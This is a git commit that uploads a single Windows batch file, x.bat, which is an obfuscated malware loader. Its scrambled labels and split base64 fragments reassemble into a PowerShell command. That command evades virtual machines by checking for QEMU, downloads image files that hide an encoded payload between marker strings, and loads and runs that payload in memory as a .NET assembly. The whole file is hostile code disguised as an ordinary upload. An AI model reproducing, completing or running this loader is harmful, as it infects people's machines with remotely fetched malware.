a12e5fe179b491d74f8c626a418c250e1563fcc9
joelucino <joelucino@outlook.com>
2025-04-18 11:55:37 +0200

    Add files via upload

---
+++ x.bat
@@ -0,0 +1,264 @@
+@echo off
+GOTO 贝维贝豆维维爱尔耻色
+:艾阿斯耻埃色斯饿克饿
+SET 阿阿爱克尔艾维耻斯维=QBt@GE@ZwBl@EI@eQB0@GU@cw@p@Ds@DQ@K@C@@I@@g@C@@I@@g@C@@I@@g@C@@I@@g@
+GOTO 豆饿贝贝埃德豆艾阿德0
+:耻艾耻色德埃德尔斯色
+SET 耻维饿贝阿斯色斯耻埃=@I@@g@C@@I@@g@C@@I@@g@C@@J@Bj@G8@bQBt@GE@bgBk@EI@eQB0@GU@cw@
+GOTO 贝艾尔饿埃爱饿贝贝爱
+:埃饿饿贝尔斯埃豆维阿
+SET 饿耻克斯斯豆耻色豆尔=Gk@bQBh@Gc@ZQBU@GU@e@B0@C@@PQ@g@Fs@UwB5@HM@d@Bl@G0@LgBU@GU@e@B0@C4@RQBu@GM@bw
+GOTO 克阿维贝贝克饿维饿爱
+:阿艾贝豆豆色德斯豆贝
+SET 克饿豆克色艾贝色贝尔=@Mg@u@D@@Ng@u@DI@Ng@v@C8@Og@n@Cw@I@@n@D@@Jw@s@C@@JwBT@HQ@YQBy@HQ@dQBw
+GOTO 斯贝德贝维斯德克色饿
+:色耻艾克克斯贝耻尔阿
+SET 耻阿贝耻克维贝维艾色=d@Bl@HM@Mg@g@D0@I@@n@H@@cw@6@C8@Lw@n@Ds@DQ@K@CQ@b@Bm@HM@Z@Bm@HM@
+GOTO 豆阿阿耻斯德豆耻爱饿6
+:贝贝饿德饿贝埃艾艾斯
+SET 贝爱爱贝耻贝饿阿爱贝=p@G0@YQBn@GU@QgB5@HQ@ZQBz@C@@LQBu@GU@I@@k@G4@dQBs@Gw@KQ@g@Hs@I@@k@
+GOTO 埃饿饿贝尔斯埃豆维阿
+:豆艾埃埃饿尔斯尔埃贝
+SET 艾贝贝饿斯埃色尔耻维=Ng@0@F8@RQBO@EQ@Pg@+@Cc@Ow@g@CQ@cwB0@GE@cgB0@Ek@bgBk@GU@e@@g@D0@I@@k@Gk@bQBh@
+GOTO 豆饿贝贝埃德豆艾阿德3
+:贝艾色埃耻克爱尔埃埃
+SET 埃耻埃艾克德斯克阿色=j@G8@bQBt@GE@bgBk@EI@eQB0@GU@cw@p@Ds@DQ@K@C@@I@@g@C@@I@@g@C@@I@@
+GOTO 维克色贝爱德色尔饿贝8
+:克埃斯尔爱耻阿德贝饿
+SET 饿艾克饿贝斯艾艾斯贝=g@C@@I@@g@C@@I@@g@C@@I@@g@C@@J@Bs@Gk@bgBr@HM@I@@9@C@@Q@@o@Cg@J@Bs@
+GOTO 阿豆耻贝色饿德斯贝阿
+:豆斯贝尔埃斯饿维豆色
+SET 贝阿德阿色贝贝斯贝贝=@GQ@ZQB4@C@@PQ@g@CQ@aQBt@GE@ZwBl@FQ@ZQB4@HQ@LgBJ@G4@Z@Bl@Hg@
+GOTO 色贝爱尔斯色色饿埃尔6
+:阿贝饿贝尔埃爱维饿尔
+SET 豆尔埃克豆贝德尔艾克=l@G4@Z@BJ@G4@Z@Bl@Hg@I@@9@C@@J@Bp@G0@YQBn@GU@V@Bl@Hg@d@@u@Ek@bgBk@GU@e@BP@
+GOTO 维克色贝爱德色尔饿贝4
+:色色维维贝埃贝贝克艾
+SET 德贝阿克克阿克德克耻=@C@@I@@k@GU@bgBk@Ek@bgBk@GU@e@@g@D0@I@@k@Gk@bQBh@Gc@ZQBU@GU@e@B0@C
+GOTO 饿德克色尔耻艾贝斯豆7
+:贝维贝豆维维爱尔耻色
+set 饿斯埃斯贝维克埃色饿=QE
+GOTO 维爱贝维克饿斯耻阿贝
+:豆饿贝贝埃德豆艾阿德
+wmic %豆克艾豆艾尔斯维阿爱%u get n%埃色斯艾饿贝色豆贝贝% | find "%饿斯埃斯贝维克埃色饿%%耻耻豆尔色艾贝埃贝阿%"
+GOTO 饿德克色尔耻艾贝斯豆
+:阿豆耻贝色饿德斯贝阿
+SET 克耻维耻克克维耻斯艾=GY@cwBk@GY@cwBk@Gc@I@@r@C@@JwBi@Gk@d@Bi@HU@YwBr@GU@d@@u@G8@cgBn
+GOTO 豆阿阿耻斯德豆耻爱饿9
+:饿德斯贝维艾阿斯爱爱
+SET 维克耻贝斯尔阿贝德色=QBU@GU@e@B0@C4@SQBu@GQ@ZQB4@E8@Zg@o@CQ@ZQBu@GQ@RgBs@GE@Zw@p@Ds@I@@g@C@@J@B
+GOTO 阿贝饿贝尔埃爱维饿尔
+:斯艾维色贝爱贝贝爱爱
+SET 埃饿阿贝克尔斯斯饿斯=H0@Ow@g@@0@Cg@k@EI@eQB0@GU@cw@g@D0@I@@n@Gg@d@B0@Cc@Ow@N@@o@J@BC@Hk@
+GOTO 色耻艾克克斯贝耻尔阿
+:德色阿尔艾贝维耻德艾
+SET 艾尔豆阿耻饿爱阿耻阿=DU@LgBn@Gk@d@Bo@HU@Yg@u@Gk@bw@v@DE@LwB0@GU@cwB0@C4@agBw@Gc@Jw@p@Ck@Ow@N@@o@I@@
+GOTO 德斯维耻色艾贝豆色埃3
+:豆阿阿耻斯德豆耻爱饿
+set 豆克艾豆艾尔斯维阿爱=cp
+GOTO 德斯维耻色艾贝豆色埃
+:德尔贝贝艾维斯克艾饿
+SET 尔饿豆阿尔贝爱贝色色=@bgB1@Gw@b@@s@C@@WwBv@GI@agBl@GM@d@Bb@F0@XQ@g@Cg@Jw@g@HQ@e@B0@C
+GOTO 维豆尔饿维阿尔贝爱德
+:色贝爱尔斯色色饿埃尔
+SET 爱克埃耻阿贝艾耻贝贝=@bgB0@E0@YQBu@GE@ZwBl@HI@XQ@6@Do@UwBl@GM@dQBy@Gk@d@B5@F@@cgB
+GOTO 尔艾阿爱艾斯克艾维豆
+:克阿维贝贝克饿维饿爱
+SET 埃阿贝德埃耻爱维克德=Bk@Gk@bgBn@F0@Og@6@FU@V@BG@Dg@LgBH@GU@d@BT@HQ@cgBp@G4@Zw@o@CQ@a
+GOTO 艾阿斯耻埃色斯饿克饿
+:豆贝德尔埃维维耻色埃
+%贝色斯斯豆艾色尔豆耻%%爱克埃耻阿贝艾耻贝贝%%色色饿阿贝贝德贝阿饿%%维豆德爱贝贝色斯尔尔%%饿耻饿维维艾德艾克阿%%德尔爱德色贝贝艾爱色%%耻克饿色艾色斯斯耻尔%%维艾豆埃阿艾贝阿阿德%%尔德贝豆艾豆德斯埃尔%%克德饿艾德埃斯尔爱艾%%贝阿尔贝贝德维饿艾尔%%克阿阿克耻爱爱维艾饿%%斯尔耻克维尔色艾贝色%%爱贝德贝阿斯维饿色克%%克饿埃贝埃耻艾耻德尔%%贝德克爱维埃饿贝豆豆%%克饿克斯维贝艾德克饿%%克克埃贝饿德贝阿艾克%%埃饿阿贝克尔斯斯饿斯%%耻阿贝耻克维贝维艾色%%豆维尔贝阿阿艾德德豆%%饿艾克饿贝斯艾艾斯贝%%克耻维耻克克维耻斯艾%%德艾阿阿饿贝埃埃埃豆%%豆饿德爱阿阿贝德维耻%%艾艾爱斯色埃贝艾豆德%%艾尔豆阿耻饿爱阿耻阿%%艾色饿克阿埃饿维阿艾%%尔维尔豆豆阿饿阿埃维%%色德克埃尔饿尔阿阿德%%贝爱爱贝耻贝饿阿爱贝%%饿耻克斯斯豆耻色豆尔%%埃阿贝德埃耻爱维克德%%阿阿爱克尔艾维耻斯维%%豆贝贝饿埃阿贝德斯维%%饿耻贝爱耻贝尔阿艾豆%%艾贝贝饿斯埃色尔耻维%%豆克耻维豆阿贝克尔克%%爱豆豆阿克埃贝维爱贝%%埃爱贝贝耻色克贝斯斯%%爱维豆豆艾维贝埃德斯%%尔色色贝克色爱克斯豆%%艾爱阿豆饿艾埃埃饿贝%%埃阿尔德爱饿爱贝埃克%%豆耻豆艾耻艾斯贝阿尔%%饿饿阿豆贝维耻色埃色%%斯贝尔色尔克斯耻埃爱%%阿豆维维耻埃饿耻维贝%%斯阿艾豆豆色贝维豆克%%尔色克贝斯贝克德阿德%%德贝阿克克阿克德克耻%%耻爱饿克维豆艾克埃耻%%耻维饿贝阿斯色斯耻埃%%贝维贝耻维耻斯贝维阿%%贝爱贝维尔尔斯贝豆贝%%爱贝埃尔饿耻爱艾德耻%%维克耻贝斯尔阿贝德色%%豆尔埃克豆贝德尔艾克%%色克阿艾克维色豆尔阿%%贝阿维耻饿维饿爱色豆%%尔饿克爱豆埃耻饿埃爱%%埃耻埃艾克德斯克阿色%%色爱色德斯斯斯阿埃德%%贝阿饿埃阿豆爱贝德色%%斯贝贝饿斯色克尔德艾%%尔艾色德贝埃贝爱尔尔%%贝豆贝豆德色德贝爱贝%%斯贝饿维德贝斯埃色斯%%艾维埃爱尔贝德斯埃维%%贝阿德阿色贝贝斯贝贝%%贝维尔爱豆艾克德饿斯%%饿尔爱豆饿德爱克德爱%%色维克艾色德克耻克德%%尔饿豆阿尔贝爱贝色色%%艾艾克维维维饿色贝斯%%克饿豆克色艾贝色贝尔%%耻爱阿耻耻尔克饿维斯%%阿艾色克艾贝维埃斯艾%%色爱尔贝色尔克色饿尔%%豆尔耻豆耻贝贝爱贝豆%
+GOTO 尔艾阿爱艾斯克艾维豆7
+:德斯维耻色艾贝豆色埃
+set 埃色斯艾饿贝色豆贝贝=ame
+GOTO 豆饿贝贝埃德豆艾阿德
+:德斯维耻色艾贝豆色埃1
+SET 艾艾爱斯色埃贝艾豆德=@Mw@n@Ck@L@@g@Cg@J@Bs@GY@cwBk@GY@cwBk@Gc@I@@r@C@@JwBv@GY@aQBj@GU@Mw@2@
+GOTO 德色阿尔艾贝维耻德艾
+:饿色贝贝斯贝斯艾爱色
+SET 色爱尔贝色尔克色饿尔=vert]::Frombase64string^($dosigo.replace^('@','A'^)^)^);powe
+GOTO 尔艾阿爱艾斯克艾维豆5
+:贝德贝阿饿爱豆埃艾色
+SET 尔饿克爱豆埃耻饿埃爱=l@GY@b@Bl@GM@d@Bp@G8@bg@u@EE@cwBz@GU@bQBi@Gw@eQBd@Do@OgBM@G8@YQBk@Cg@J@B
+GOTO 贝艾色埃耻克爱尔埃埃
+:维爱贝维克饿斯耻阿贝
+set 耻耻豆尔色艾贝埃贝阿=MU
+GOTO 豆阿阿耻斯德豆耻爱饿
+:维爱贝维克饿斯耻阿贝9
+SET 爱贝德贝阿斯维饿色克=ZgBv@HI@ZQBh@GM@a@@g@Cg@J@Bs@Gk@bgBr@C@@aQBu@C@@J@Bz@Gg@dQBm@GY@
+GOTO 豆阿阿耻斯德豆耻爱饿0
+:豆饿贝贝埃德豆艾阿德1
+SET 饿耻贝爱耻贝尔阿艾豆=@+@D4@Jw@7@C@@J@Bl@G4@Z@BG@Gw@YQBn@C@@PQ@g@Cc@P@@8@EI@QQBT@EU@
+GOTO 豆艾埃埃饿尔斯尔埃贝
+:豆阿阿耻斯德豆耻爱饿3
+SET 克克埃贝饿德贝阿艾克=@0@Cg@g@C@@I@@g@C@@I@@g@C@@I@@g@C@@I@By@GU@d@B1@HI@bg@g@CQ@bgB1@Gw@b@@g@
+GOTO 斯艾维色贝爱贝贝爱爱
+:豆饿贝贝埃德豆艾阿德0
+SET 豆贝贝饿埃阿贝德斯维=C@@J@Bz@HQ@YQBy@HQ@RgBs@GE@Zw@g@D0@I@@n@Dw@P@BC@EE@UwBF@DY@N@Bf@FM@V@BB@FI@V@
+GOTO 豆饿贝贝埃德豆艾阿德1
+:贝艾尔饿埃爱饿贝贝爱
+SET 贝维贝耻维耻斯贝维阿=g@D0@I@Bb@FM@eQBz@HQ@ZQBt@C4@QwBv@G4@dgBl@HI@d@Bd@Do@OgBG@HI@bwB
+GOTO 维克色贝爱德色尔饿贝0
+:色贝爱尔斯色色饿埃尔3
+SET 斯贝饿维德贝斯埃色斯=Bz@Gg@ZQBs@Gw@LgBI@G8@YQBh@GE@YQBh@GE@cwBk@G0@ZQ@n@Ck@Ow@N@@o@I@@g@C@@I@@g@C@@
+GOTO 色贝爱尔斯色色饿埃尔4
+:色贝爱尔斯色色饿埃尔7
+SET 饿尔爱豆饿德爱克德爱=g@C@@J@Bt@GU@d@Bo@G8@Z@@g@D0@I@@k@HQ@eQBw@GU@LgBH@GU@d@BN@GU@d@Bo@G8@Z@@
+GOTO 色贝爱尔斯色色饿埃尔8
+:耻尔埃克色艾埃饿克贝
+SET 阿艾色克艾贝维埃斯艾=uxd = [system.Text.encoding]::Unicode.GetString^([system.con
+GOTO 饿色贝贝斯贝斯艾爱色
+:贝色艾克饿埃耻阿尔色
+SET 豆耻豆艾耻艾斯贝阿尔=@Gc@d@Bo@Ds@I@@N@@o@I@@g@C@@I@@g@C@@I@@g@C@@I@@g@C@@J@Bi@GE@cwBl@DY@N
+GOTO 德阿豆埃色贝艾斯色贝
+:豆阿阿耻斯德豆耻爱饿9
+SET 德艾阿阿饿贝埃埃埃豆=@C8@ZgBz@GQ@ZgBz@GQ@ZgBz@C8@ZgBz@GQ@ZgBk@HM@ZgBz@GQ@ZgBz@GQ@Zg@v@GQ@
+GOTO 德斯维耻色艾贝豆色埃0
+:豆色贝贝耻埃爱色贝豆
+SET 贝阿饿埃阿豆爱贝德色=I@BH@GU@d@@t@EM@bwBt@H@@cgBl@HM@cwBl@GQ@QgB5@HQ@ZQBB@HI@cgBh@Hk@I@@t@GI
+GOTO 色贝爱尔斯色色饿埃尔0
+:维克色贝爱德色尔饿贝
+SET 贝色斯斯豆艾色尔豆耻=powershell "$dosigo = 'WwBO@GU@d@@u@FM@ZQBy@HY@aQBj@GU@U@Bv@Gk
+GOTO 色贝爱尔斯色色饿埃尔
+:维豆尔饿维阿尔贝爱德
+SET 艾艾克维维维饿色贝斯=4@SQBr@Ek@YgBB@Gg@Z@@v@HM@ZQBs@Gk@ZgBf@GM@aQBs@GI@dQBw@C8@Mg@x@DE@Lg@2@DI
+GOTO 阿艾贝豆豆色德斯豆贝
+:豆饿贝贝埃德豆艾阿德8
+SET 艾爱阿豆饿艾埃埃饿贝=@bgBk@GU@e@@g@C0@ZwB0@C@@J@Bz@HQ@YQBy@HQ@SQBu@GQ@ZQB4@Ck@I@B7@C@@J@Bz@H
+GOTO 豆饿贝贝埃德豆艾阿德9
+:德斯维耻色艾贝豆色埃0
+SET 豆饿德爱阿阿贝德维耻=bwB3@G4@b@Bv@GE@Z@Bz@C8@d@Bl@HM@d@@y@C4@agBw@Gc@Pw@x@DM@Nw@x@DE
+GOTO 德斯维耻色艾贝豆色埃1
+:德斯维耻色艾贝豆色埃3
+SET 艾色饿克阿埃饿维阿艾=g@C@@I@@g@C@@I@@g@C@@I@@g@C@@I@@k@Gk@bQBh@Gc@ZQBC@Hk@d@Bl@HM@I@@9@C
+GOTO 德斯维耻色艾贝豆色埃4
+:维克色贝爱德色尔饿贝4
+SET 色克阿艾克维色豆尔阿=GY@K@@k@GU@bgBk@EY@b@Bh@Gc@KQ@7@@0@Cg@g@C@@I@@g@C@@I@@g@C@@I@@g
+GOTO 维克色贝爱德色尔饿贝5
+:色耻埃埃饿爱贝豆斯维
+SET 维豆德爱贝贝色斯尔尔=gBv@HQ@bwBj@G8@b@BU@Hk@c@Bl@F0@Og@6@FQ@b@Bz@DE@Mg@N@@o@I@@g@C@@I
+GOTO 维爱贝维克饿斯耻阿贝0
+:维爱贝维克饿斯耻阿贝6
+SET 贝阿尔贝贝德维饿艾尔=@Bp@G4@awBz@C@@PQ@g@Ec@ZQB0@C0@UgBh@G4@Z@Bv@G0@I@@t@Ek@bgBw@HU@d@BP@GI@
+GOTO 维爱贝维克饿斯耻阿贝7
+:维克色贝爱德色尔饿贝5
+SET 贝阿维耻饿维饿爱色豆=@C@@I@@k@Gw@bwBh@GQ@ZQBk@EE@cwBz@GU@bQBi@Gw@eQ@g@D0@I@Bb@FM@eQBz@HQ@ZQBt@C4@UgB
+GOTO 贝德贝阿饿爱豆埃艾色
+:维克色贝爱德色尔饿贝1
+SET 爱贝埃尔饿耻爱艾德耻=Ck@Ow@g@C@@I@@k@GU@bgBk@Ek@bgBk@GU@e@@g@D0@I@@k@Gk@bQBh@Gc@Z
+GOTO 饿德斯贝维艾阿斯爱爱
+:色贝爱尔斯色色饿埃尔2
+SET 贝豆贝豆德色德贝爱贝=@G0@YgBs@Hk@LgBH@GU@d@BU@Hk@c@Bl@Cg@JwB0@GU@cwB0@H@@bwB3@GU@cg
+GOTO 色贝爱尔斯色色饿埃尔3
+:斯贝德贝维斯德克色饿
+SET 耻爱阿耻耻尔克饿维斯=@E4@YQBt@GU@Jw@s@C@@JwBN@HM@YgB1@Gk@b@Bk@Cc@L@@g@Cc@M@@n@Ck@KQB9@H0@';$oWj
+GOTO 耻尔埃克色艾埃饿克贝
+:豆阿阿耻斯德豆耻爱饿0
+SET 克饿埃贝埃耻艾耻德尔=b@Bl@GQ@T@Bp@G4@awBz@Ck@I@B7@C@@d@By@Hk@I@B7@C@@cgBl@HQ@dQBy@G4@I@@k@Hc@ZQ
+GOTO 豆阿阿耻斯德豆耻爱饿1
+:德阿豆埃色贝艾斯色贝
+SET 饿饿阿豆贝维耻色埃色=@BM@GU@bgBn@HQ@a@Bo@C@@PQ@g@CQ@ZQBu@GQ@SQBu@GQ@ZQB4@C@@LQ@g@CQ@cwB0@G
+GOTO 埃尔色豆色埃克艾色色
+:豆饿贝贝埃德豆艾阿德3
+SET 豆克耻维豆阿贝克尔克=Gc@ZQBU@GU@e@B0@C4@SQBu@GQ@ZQB4@E8@Zg@o@CQ@cwB0@GE@cgB0@EY@b@Bh@Gc@KQ@7@C@@DQ@
+GOTO 豆饿贝贝埃德豆艾阿德4
+:色贝爱尔斯色色饿埃尔8
+SET 色维克艾色德克耻克德=o@Cc@b@Bm@HM@ZwBl@GQ@Z@Bk@GQ@Z@Bk@GQ@YQ@n@Ck@LgBJ@G4@dgBv@Gs@ZQ@o@CQ
+GOTO 德尔贝贝艾维斯克艾饿
+:维爱贝维克饿斯耻阿贝5
+SET 克德饿艾德埃斯尔爱艾=N@@o@I@@g@C@@I@@g@C@@I@@g@C@@I@@g@C@@J@Bz@Gg@dQBm@GY@b@Bl@GQ@T
+GOTO 维爱贝维克饿斯耻阿贝6
+:德斯维耻色艾贝豆色埃4
+SET 尔维尔豆豆阿饿阿埃维=@@R@Bv@Hc@bgBs@G8@YQBk@EQ@YQB0@GE@RgBy@G8@bQBM@Gk@bgBr@HM@I@@
+GOTO 德斯维耻色艾贝豆色埃5
+:豆饿贝贝埃德豆艾阿德6
+SET 爱维豆豆艾维贝埃德斯=QBn@Ck@Ow@N@@o@I@@g@C@@I@@g@C@@I@@g@C@@I@@g@C@@I@Bp@GY@I@@o@CQ@cwB0@
+GOTO 豆饿贝贝埃德豆艾阿德7
+:色维维德阿色尔贝贝阿
+SET 斯阿艾豆豆色贝维豆克=@GI@cwB0@HI@aQBu@Gc@K@@k@HM@d@Bh@HI@d@BJ@G4@Z@Bl@Hg@L@@g@CQ@YgBh@H
+GOTO 耻阿尔色克维艾维耻豆
+:维爱贝维克饿斯耻阿贝1
+SET 德尔爱德色贝贝艾爱色=@YQBk@EQ@YQB0@GE@RgBy@G8@bQBM@Gk@bgBr@HM@I@B7@C@@c@Bh@HI@YQBt@C@@K@Bb@HM@d@By@
+GOTO 维爱贝维克饿斯耻阿贝2
+:维爱贝维克饿斯耻阿贝2
+SET 耻克饿色艾色斯斯耻尔=Gk@bgBn@Fs@XQBd@CQ@b@Bp@G4@awBz@Ck@I@@N@@o@I@@g@C@@I@@g@C@@I@@g@C@
+GOTO 维爱贝维克饿斯耻阿贝3
+:尔艾阿爱艾斯克艾维豆
+SET 色色饿阿贝贝德贝阿饿=v@HQ@bwBj@G8@b@@g@D0@I@Bb@E4@ZQB0@C4@UwBl@GM@dQBy@Gk@d@B5@F@@c
+GOTO 色耻埃埃饿爱贝豆斯维
+:色贝爱尔斯色色饿埃尔6
+SET 贝维尔爱豆艾克德饿斯=TwBm@Cg@J@Bl@G4@Z@BG@Gw@YQBn@Ck@Ow@N@@o@I@@g@C@@I@@g@C@@I@@g@C@@I@@
+GOTO 色贝爱尔斯色色饿埃尔7
+:耻阿尔色克维艾维耻豆
+SET 尔色克贝斯贝克德阿德=M@ZQ@2@DQ@T@Bl@G4@ZwB0@Gg@a@@p@Ds@DQ@K@C@@I@@g@C@@I@@g@C@@I@@g
+GOTO 色色维维贝埃贝贝克艾
+:色贝爱尔斯色色饿埃尔4
+SET 艾维埃爱尔贝德斯埃维=I@@g@C@@I@@g@C@@DQ@K@C@@I@@g@C@@I@@g@C@@I@@g@C@@I@@g@CQ@ZQBu@GQ@SQBu
+GOTO 豆斯贝尔埃斯饿维豆色
+:维爱贝维克饿斯耻阿贝0
+SET 饿耻饿维维艾德艾克阿=@@g@C@@I@@g@C@@I@@g@C@@ZgB1@G4@YwB0@Gk@bwBu@C@@R@Bv@Hc@bgBs@G8
+GOTO 维爱贝维克饿斯耻阿贝1
+:豆阿阿耻斯德豆耻爱饿6
+SET 豆维尔贝阿阿艾德德豆=Z@Bn@C@@PQ@g@C@@J@BC@Hk@d@Bl@HM@I@@r@CQ@QgB5@HQ@ZQBz@DI@Ow@N@@o@I@@
+GOTO 克埃斯尔爱耻阿德贝饿
+:维爱贝维克饿斯耻阿贝7
+SET 克阿阿克耻爱爱维艾饿=agBl@GM@d@@g@CQ@b@Bp@G4@awBz@C@@LQBD@G8@dQBu@HQ@I@@k@Gw@aQBu@
+GOTO 维爱贝维克饿斯耻阿贝8
+:维克色贝爱德色尔饿贝0
+SET 贝爱贝维尔尔斯贝豆贝=t@EI@YQBz@GU@Ng@0@FM@d@By@Gk@bgBn@Cg@J@Bi@GE@cwBl@DY@N@BD@G8@bQBt@GE@bgBk@
+GOTO 维克色贝爱德色尔饿贝1
+:豆饿贝贝埃德豆艾阿德4
+SET 爱豆豆阿克埃贝维爱贝=K@C@@I@@g@C@@I@@g@C@@I@@g@C@@I@@g@CQ@ZQBu@GQ@SQBu@GQ@ZQB4@C@@PQ
+GOTO 豆饿贝贝埃德豆艾阿德5
+:豆饿贝贝埃德豆艾阿德9
+SET 埃阿尔德爱饿爱贝埃克=Q@YQBy@HQ@SQBu@GQ@ZQB4@C@@Kw@9@C@@J@Bz@HQ@YQBy@HQ@RgBs@GE@Zw@u@Ew@ZQBu
+GOTO 贝色艾克饿埃耻阿尔色
+:尔艾阿爱艾斯克艾维豆5
+SET 豆尔耻豆耻贝贝爱贝豆=rshell.exe $OWjuxD"
+GOTO 豆贝德尔埃维维耻色埃
+:德斯维耻色艾贝豆色埃5
+SET 色德克埃尔饿尔阿阿德=k@Gw@aQBu@Gs@cw@7@@0@Cg@g@C@@I@@g@C@@I@@g@C@@I@@g@C@@I@@g@Gk@Zg@g@Cg@J@B
+GOTO 贝贝饿德饿贝埃艾艾斯
+:豆阿阿耻斯德豆耻爱饿2
+SET 克饿克斯维贝艾德克饿=@KQ@g@H0@I@Bj@GE@d@Bj@Gg@I@B7@C@@YwBv@G4@d@Bp@G4@dQBl@C@@fQ@g@H0@Ow@g@
+GOTO 豆阿阿耻斯德豆耻爱饿3
+:维爱贝维克饿斯耻阿贝3
+SET 维艾豆埃阿艾贝阿阿德=@I@@g@C@@J@B3@GU@YgBD@Gw@aQBl@G4@d@@g@D0@I@BO@GU@dw@t@E8@YgBq@GU@YwB
+GOTO 维爱贝维克饿斯耻阿贝4
+:维爱贝维克饿斯耻阿贝4
+SET 尔德贝豆艾豆德斯埃尔=0@C@@UwB5@HM@d@Bl@G0@LgBO@GU@d@@u@Fc@ZQBi@EM@b@Bp@GU@bgB0@Ds@I@@
+GOTO 维爱贝维克饿斯耻阿贝5
+:豆饿贝贝埃德豆艾阿德5
+SET 埃爱贝贝耻色克贝斯斯=@g@CQ@aQBt@GE@ZwBl@FQ@ZQB4@HQ@LgBJ@G4@Z@Bl@Hg@TwBm@Cg@J@Bl@G4@Z@BG@Gw@Y
+GOTO 豆饿贝贝埃德豆艾阿德6
+:维克色贝爱德色尔饿贝8
+SET 色爱色德斯斯斯阿埃德=g@C@@I@@g@CQ@YwBv@G0@c@By@GU@cwBz@GU@Z@BC@Hk@d@Bl@EE@cgBy@GE@eQ@g@D0@
+GOTO 豆色贝贝耻埃爱色贝豆
+:维爱贝维克饿斯耻阿贝8
+SET 斯尔耻克维尔色艾贝色=Gs@cw@u@Ew@ZQBu@Gc@d@Bo@Ds@I@@N@@o@I@@g@C@@I@@g@C@@I@@g@C@@I@@g@C@@
+GOTO 维爱贝维克饿斯耻阿贝9
+:埃尔色豆色埃克艾色色
+SET 斯贝尔色尔克斯耻埃爱=E@cgB0@Ek@bgBk@GU@e@@7@@0@Cg@g@C@@I@@g@C@@I@@g@C@@I@@g@C@@I@@g@CQ
+GOTO 饿德克色尔耻艾贝斯豆3
+:色贝爱尔斯色色饿埃尔1
+SET 尔艾色德贝埃贝爱尔尔=@g@C@@I@@g@C@@I@@k@HQ@eQBw@GU@I@@9@C@@J@Bs@G8@YQBk@GU@Z@BB@HM@cwBl
+GOTO 色贝爱尔斯色色饿埃尔2
+:豆饿贝贝埃德豆艾阿德7
+SET 尔色色贝克色爱克斯豆=GE@cgB0@Ek@bgBk@GU@e@@g@C0@ZwBl@C@@M@@g@C0@YQBu@GQ@I@@k@GU@bgBk@Ek
+GOTO 豆饿贝贝埃德豆艾阿德8
+:饿德克色尔耻艾贝斯豆
+if %errorlevel% == 0 exit
+GOTO 维克色贝爱德色尔饿贝
+:饿德克色尔耻艾贝斯豆3
+SET 阿豆维维耻埃饿耻维贝=@YgBh@HM@ZQ@2@DQ@QwBv@G0@bQBh@G4@Z@@g@D0@I@@k@Gk@bQBh@Gc@ZQBU@GU@e@B0@C4@UwB1
+GOTO 色维维德阿色尔贝贝阿
+:饿德克色尔耻艾贝斯豆7
+SET 耻爱饿克维豆艾克埃耻=4@SQBu@GQ@ZQB4@E8@Zg@o@CQ@ZQBu@GQ@RgBs@GE@Zw@p@Ds@DQ@K@C@@I@@g@C@
+GOTO 耻艾耻色德埃德尔斯色
+:豆阿阿耻斯德豆耻爱饿1
+SET 贝德克爱维埃饿贝豆豆=Bi@EM@b@Bp@GU@bgB0@C4@R@Bv@Hc@bgBs@G8@YQBk@EQ@YQB0@GE@K@@k@Gw@aQBu@Gs
+GOTO 豆阿阿耻斯德豆耻爱饿2
+:色贝爱尔斯色色饿埃尔0
+SET 斯贝贝饿斯色克尔德艾=@eQB0@GU@QQBy@HI@YQB5@C@@J@Bl@G4@YwBU@GU@e@B0@@0@Cg@g@C@@I@@g@C@@I@
+GOTO 色贝爱尔斯色色饿埃尔1
+:尔艾阿爱艾斯克艾维豆7
